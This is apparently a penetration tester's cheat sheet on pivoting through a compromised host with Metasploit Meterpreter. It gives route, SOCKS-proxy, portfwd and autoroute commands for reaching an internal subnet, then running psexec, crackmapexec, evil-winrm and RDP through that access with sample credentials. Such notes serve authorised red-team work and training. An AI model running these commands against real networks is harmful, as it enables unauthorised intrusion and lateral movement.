# Meterpreter Pivoting

Use when you cannot drop Ligolo/Chisel binaries. Slower but built into metasploit.

## Routes (for MSF modules only)

Routes tell Metasploit to send traffic for a subnet through a session. Only affects MSF modules — not external tools.

```
meterpreter> background

# Add route
msf> route add 172.16.1.0/24 <SESSION_ID>

# View routes
msf> route print

# Remove
msf> route remove 172.16.1.0/24 <SESSION_ID>
msf> route flush
```

Now run any MSF module against internal hosts:
```
msf> use exploit/windows/smb/psexec
msf> set RHOSTS 172.16.1.100
# Traffic automatically routes through your session
```

## SOCKS proxy (for external tools via proxychains)

```
msf> use auxiliary/server/socks_proxy
msf> set SRVPORT 1080
msf> set VERSION 5
msf> set SESSION <SESSION_ID>
msf> run -j

# /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

proxychains crackmapexec smb 172.16.1.0/24
proxychains evil-winrm -i 172.16.1.100 -u admin -p Pass123
```

## Port forwarding (portfwd) — specific ports only

```
meterpreter> portfwd add -l 3390 -p 3389 -r 172.16.1.5
# Kali:3390 → via meterpreter → 172.16.1.5:3389
xfreerdp /v:127.0.0.1:3390 /u:admin /p:Pass123

meterpreter> portfwd add -l 8080 -p 80 -r 172.16.1.10
curl http://127.0.0.1:8080/

meterpreter> portfwd list
meterpreter> portfwd delete -l 3390
meterpreter> portfwd flush
```

## autoroute (add route from within meterpreter)

```
meterpreter> run post/multi/manage/autoroute SUBNET=172.16.1.0/24
# Or:
meterpreter> run autoroute -s 172.16.1.0/24
meterpreter> run autoroute -p       # print routes
```

## Important limitations

- Session dies = all routes and port forwards die with it
- SOCKS proxy is slow (HTTP-based, not TUN)
- UDP doesn't work through the SOCKS proxy
- Much slower than Ligolo for multi-host scanning — use `-sT` (TCP connect) not `-sS` (SYN) with nmap via proxychains
- Route only works for MSF modules unless you also run socks_proxy
